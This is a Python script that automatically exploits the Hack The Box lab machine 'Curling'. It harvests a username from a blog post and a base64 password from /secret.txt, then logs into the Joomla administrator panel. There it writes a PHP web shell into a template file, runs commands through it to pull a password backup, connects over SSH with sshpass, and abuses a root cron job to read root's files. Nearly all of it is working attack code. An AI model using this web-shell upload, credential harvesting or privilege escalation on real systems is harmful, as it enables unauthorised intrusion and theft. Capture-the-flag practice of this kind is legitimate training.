import sys
import requests
import urllib3
import base64
import subprocess
import time
from bs4 import BeautifulSoup

Palette = {
    'red': '\033[31m',
    'green': '\033[32m',
    'yellow': '\033[33m',
    'blue': '\033[34m',
    'purple': '\033[35m',
    'cyan': '\033[36m',
    'grey': '\033[37m',
    'reset': '\033[0m'
}

def exit():
    print("\n" + Palette['red'] + "[X] Closing program...")
    sys.exit()

def final_banner():
    print(Palette['purple'] + "[*] Exploit complete! Maybe a respect ;)?\n[*] HTB PROFILE --> https://app.hackthebox.com/profile/1104062" + Palette['reset'])  

def banner():
    print(Palette['green'] + """
 _   _ _____ ____   ____           _ _             
| | | |_   _| __ ) / ___|   _ _ __| (_)_ __   __ _ 
| |_| | | | |  _ \| |  | | | | '__| | | '_ \ / _` |
|  _  | | | | |_) | |__| |_| | |  | | | | | | (_| |
|_| |_| |_| |____/ \____\__,_|_|  |_|_|_| |_|\__, |
                                             |___/ 
             _                            
  __ _ _   _| |_ ___  _ ____      ___ __  
 / _` | | | | __/ _ \| '_ \ \ /\ / / '_ \ 
| (_| | |_| | || (_) | |_) \ V  V /| | | |
 \__,_|\__,_|\__\___/| .__/ \_/\_/ |_| |_| by Void4m0n
                     |_|   
""" + Palette['reset'])


def waiting_animation():
    for i in range(3):
        print(Palette['yellow'] + ".", end='',flush=True)
        time.sleep(0.7)
    print(Palette['reset'] + "\n")
    return


def machine_up(Curling_ip):
    Curling_url = f"http://{Curling_ip}:80/"
    print(Palette['yellow'] + "[*] Checking status of Curling" + Palette['reset'], end='') 
    waiting_animation()
    for i in range(10):
        try:
            r = requests.head(Curling_url, timeout=5)
            break
        except requests.exceptions.RequestException as e:
            i += 1 
            if i == 1:
                print(Palette['purple'] + f"[!] Curling seems to be down, the script will try 10 times to connect Curling\n[?] CHECK URL --> http://{Curling_ip}:80/\n")
            try_msg = Palette['purple'] + "--> "+ str(i) + " TRY\n"
            e = Palette['red'] + "[!] CURLING DOWN! " + try_msg + Palette['reset']
            print(e)
            time.sleep(15)
            if i == 10:   
                exit()

    print(Palette['green'] + "[+] CURLING UP!" + Palette['reset'])

def user_floris(Curling_ip):
    url_user = f"http://{Curling_ip}:80/index.php/2-uncategorised/1-first-post-of-curling2018"
    r_user = requests.get(url_user, timeout=3)

    soup = BeautifulSoup(r_user.text, 'html.parser')
    User_element = soup.find('p', string='- Floris')

    User_extracted = User_element.text.lower().replace("- ", "")

    print("\n" + Palette['yellow'] + "[*] Extracting user from the post 'My first post of curling in 2018!'", end="")
    waiting_animation()

    print(Palette['green'] + "[+] USER FOUND: " + User_extracted + Palette['reset'])

    return User_extracted

# This function will get the password encoded in base64 inside the secret.txt file
def secret_pass(Curling_ip):
    url_pass = f"http://{Curling_ip}:80/secret.txt"
    r_pass = requests.get(url_pass)
    byte_pass = r_pass.text
    print("\n" + Palette['yellow'] + "[*] Decoding base64 pass found in /secret.txt file", end="")
    waiting_animation() 
    final_pass = base64.b64decode(byte_pass).decode("utf-8")
    print(Palette['green'] + "[*] PASSWORD DECODED: " + final_pass + Palette['reset'])
    return final_pass

def ssh_floris(username, Curling_ip):
    
    print(Palette['yellow'] + "[*] Connection trough SSH", end="")
    waiting_animation()
    try: 
        user_txt_command = subprocess.run(f"sshpass -ffiles/password.txt ssh -o StrictHostKeyChecking=no {username}@{Curling_ip} 'cat user.txt'", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError as e:
        error = Palette['purple']  + e.stderr.decode().strip()
        print(Palette['red'] + "[!] Fail connecting with sshpass, bash error: " + error)
        exit()
    
    user_txt = user_txt_command.stdout.decode()
    print(Palette['green'] + "[*] USER.TXT FLAG: " + user_txt + Palette['reset'])
    
    print(Palette['yellow'] + "[*] Exploiting vuln in cron task", end="")
    waiting_animation()

    root_txt_command = subprocess.run(f"sshpass -ffiles/password.txt ssh -o StrictHostKeyChecking=no {username}@{Curling_ip} 'cd admin-area && printf \"url = file:///root/root.txt\noutput = /home/floris/admin-area/report\" > input && while true; do if [ $(wc -l < /home/floris/admin-area/report) -eq 1 ]; then cat /home/floris/admin-area/report; break; fi; sleep 10; done'", shell=True, capture_output=True)

    root_txt = root_txt_command.stdout.decode()

    print(Palette['green'] + "[*] ROOT.TXT FLAG: " + root_txt)

    return

def extracting_backup_pass(hex_data_parse):
    
    print("\n" + Palette['yellow'] + "[*] Extracting Password_backup of floris" + Palette['reset'])
    try: 
        print("\n" + Palette['yellow']  + "    [!] Creating folder", end="")
        waiting_animation()
        subprocess.run("mkdir -p files", shell=True, check=True, stderr=subprocess.DEVNULL) 

    except subprocess.CalledProcessError as e:
        e = Palette['red'] + "    [X] The script Fail creating the folder 'files'" + Palette['reset']
        print(e, end="")
        exit()

    print(Palette['green'] + "    [+] Folder 'files' created successfully" + Palette['reset'])

    with open('files/bzip_pass.dat', 'w') as bzip_pass:
       bzip_pass.write(hex_data_parse) 
       bzip_pass.close()
    
    print("\n" + Palette['yellow'] + "    [!] Extracting file", end="")
    waiting_animation()
    
    # handler for bash erros like, gunzip not found, etc... 
    try:     
        subprocess.run("cd files && cat bzip_pass.dat | xxd -r > bzip_pass_2.dat && bzip2 -dkqf bzip_pass_2.dat && mv bzip_pass_2.dat.out gz_pass.gz && gunzip -f gz_pass.gz && bzip2 -dkqf gz_pass &&  tar -xf gz_pass.out", shell=True, check=True, stderr=subprocess.PIPE)
        print(Palette['green'] + "    [+] File extracted successfully: bin --> bzip2 --> gunzip --> bzip2 --> tar --> Secret.txt " + Palette['reset']) 
    except subprocess.CalledProcessError as e:
        error = Palette['purple'] + e.stderr.decode().strip()
        print(Palette['red'] + "    [X] Fail extracting file, bash error: " + error + Palette['reset'])
        exit()
       
    print("\n" + Palette['yellow']  + "    [!] Reading Password.txt", end="")
    waiting_animation()

    password_floris = open("files/password.txt", "r")  
    pass_test = password_floris.read()
    print(Palette['green'] + "    [*] FLORIS PASSWORD: " + pass_test + Palette['reset'])
    

def RCE_WEB_SHELL(s, url_joomla_login, token):
    
    RCE_template_url = url_joomla_login + "?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA"
    
    csrf_token_template = s.get(RCE_template_url)
    csrf_token_2 = csrf_token_template.content.decode().split('type="hidden" name="').pop().split('"')[0]

    print("\n" + Palette['yellow'] + "[*] Extracting CSRF TOKEN for update template", end="")
    waiting_animation()
    
    print(Palette['green'] + "[+] CSRF TOKEN FOUND: " + csrf_token_2 + Palette['reset'])
    
    print("\n" + Palette['yellow'] + "[*] Uploading web shell as 'error.php'", end="")
    waiting_animation()
   

    RCE_payload = {
            'jform[source]' : '<?=`$_GET[cmd]`?>',
            'task' : 'template.apply',
            csrf_token_2 : '1',
            'jform[extension_id]' : '506',
            'jform[filename]' : '/error.php',
            } 
    RCE_template = s.post(RCE_template_url, data=RCE_payload, allow_redirects=True) 
    
    

    url_default = f"http://{Curling_ip}:80"

    
    url_web_shell_rce = url_default + "/templates/protostar/error.php?cmd=%63%61%74%20%2f%68%6f%6d%65%2f%66%6c%6f%72%69%73%2f%70%61%73%73%77%6f%72%64%5f%62%61%63%6b%75%70"
    
    try:
        RCE_floris_pass = s.get(url_web_shell_rce, timeout=5)
        print(Palette['green'] + "[*] PAYLOAD: cat /home/floris/password_backup" + Palette['reset'])
        print(Palette['green'] + "[*] RCE: " + url_web_shell_rce  + Palette['reset'])
        print(Palette['green'] + "[+] RCE achieved, getting /home/floris/password_backup" + Palette['reset'])
    except:
        exit()

    hex_data =  RCE_floris_pass.text

    hex_data_parse = ''.join(hex_data)

    extracting_backup_pass(hex_data_parse)


def admin_joomla_login(Curling_ip, username, password):
    
    url_joomla_login = f"http://{Curling_ip}:80/administrator/index.php"
     
    s = requests.Session()
   
    response = s.get(url_joomla_login)
    token = response.content.decode().split('type="hidden" name="').pop().split('"')[0]
    
    print("\n" + Palette['yellow'] + "[*] Extracting CSRF TOKEN for Joomla login as Admin", end="")
    waiting_animation()
    
    print(Palette['green'] + "[+] CSRF TOKEN FOUND " + token + Palette['reset'])
    
    data = {
		'username': username,
		'passwd': password,
        'option' : 'com_login',
		'task': 'login',
        'return' : 'aW5kZXgucGhwP29wdGlvbj1jb21fYWRtaW4mdmlldz1zeXNpbmZv',
	    token : '1'
    }
    
    admin_login_post = s.post(url_joomla_login, data=data) 
    
    print("\n" + Palette['yellow'] + "[*] Login as Admin in Joomla", end="")
    waiting_animation()

    if "Linux curling" in admin_login_post.text:
        print(Palette['green'] + "[+] Admin Login Success!" + Palette['reset'])
        RCE_WEB_SHELL(s, url_joomla_login, token)
    else:
        print('[!] Admin Login Failure!')
        exit()


if __name__ == "__main__":
    Curling_ip = "10.10.10.150"
    banner()
    machine_up(Curling_ip)
    username = user_floris(Curling_ip)
    password = secret_pass(Curling_ip)
    admin_joomla_login(Curling_ip, username, password)
    ssh_floris(username, Curling_ip)
    final_banner()
